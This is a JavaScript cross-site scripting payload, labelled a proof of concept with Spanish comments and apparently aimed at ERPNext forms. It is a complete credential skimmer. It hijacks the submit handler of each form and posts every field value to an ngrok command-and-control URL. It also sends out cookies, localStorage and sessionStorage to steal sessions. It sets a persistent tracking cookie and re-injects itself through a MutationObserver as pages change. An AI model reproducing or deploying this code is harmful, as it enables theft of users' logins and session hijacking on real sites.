console.log("%c[!!!] PAYLOAD EJECUTADO DESDE GITHUB", "background: red; color: white; font-size: 20px;");

(function() {
    // 1. Identificador único de sesión
    var uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });

    var c2_url = 'https://finley-dimming-ladawn.ngrok-free.dev'; // <--- CAMBIA ESTO

    function logInfection(step, details) {
        console.log("[XSS-POC] " + step + ": " + (details || "Ejecutado"));
    }

    // 2. Extractor Agresivo de Datos
    function extractAndSend(form) {
        var credentials = {};
        
        // Buscamos absolutamente todo lo que pueda contener datos
        var inputs = form.querySelectorAll('input, select, textarea');
        inputs.forEach(function(input) {
            // Prioridad de ID: name -> id -> placeholder -> type
            var key = input.name || input.id || input.placeholder || input.type;
            var value = input.value;
            
            if (value && key) {
                credentials[key] = value;
            }
        });

        // Metadata para el reporte forense
        credentials["_victim_id"] = uuid;
        credentials["_url"] = window.location.href;
        credentials["_ua"] = navigator.userAgent;

        // Exfiltración con keepalive (sobrevive a la recarga de la página)
        fetch(c2_url, {
            method: 'POST',
            mode: 'cors',
            keepalive: true, 
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(credentials)
        }).catch(e => console.error("Error exfiltrando:", e));
        
        logInfection("Exfiltración", "Datos enviados al C2");
    }

    // 3. Inyección en formularios
    function injectHandlers() {
        document.querySelectorAll('form').forEach(function(form) {
            if (form.getAttribute('data-xss-injected')) return;
            
            // Buscamos el botón de envío
            var btn = form.querySelector('button[type="submit"], input[type="submit"]') || form.querySelector('button');
            
            if (btn) {
                var originalHandler = btn.onclick;
                btn.onclick = function(e) {
                    extractAndSend(form);
                    if (typeof originalHandler === 'function') {
                        return originalHandler.call(this, e);
                    }
                };
                form.setAttribute('data-xss-injected', 'true');
                logInfection("Inyección", "Formulario interceptado con éxito");
            }
        });
    }

// Añade esto a tu función extractAndSend o ejecútalo aparte
    function stealSession() {
        var sessionData = {
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            _url: window.location.href,
            _timestamp: new Date().getTime()
        };

        fetch('https://finley-dimming-ladawn.ngrok-free.dev/session', {
            method: 'POST',
            mode: 'cors',
            keepalive: true,
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(sessionData)
        });
    }

    // 4. Persistencia en el navegador (Caché profundo)
    function setPersistence() {
        try {
            localStorage.setItem("erp_session_cache_" + uuid, "active");
            document.cookie = "p_session=" + uuid + "; path=/; max-age=31536000";
            logInfection("Persistencia", "LocalStorage y Cookies configuradas");
        } catch(e) {}
    }

    // 5. Vigilancia de cambios en el DOM (Para SPAs como ERPNext)
    var observer = new MutationObserver(function() {
        injectHandlers();
    });

    // Ejecución inicial
    setPersistence();
    injectHandlers();
    observer.observe(document.body, {childList: true, subtree: true});
    stealSession();
    
    console.log("%c POC CARGADA - MONITORIZANDO FORMULARIOS ", "background: red; color: white; font-weight: bold;");
})();
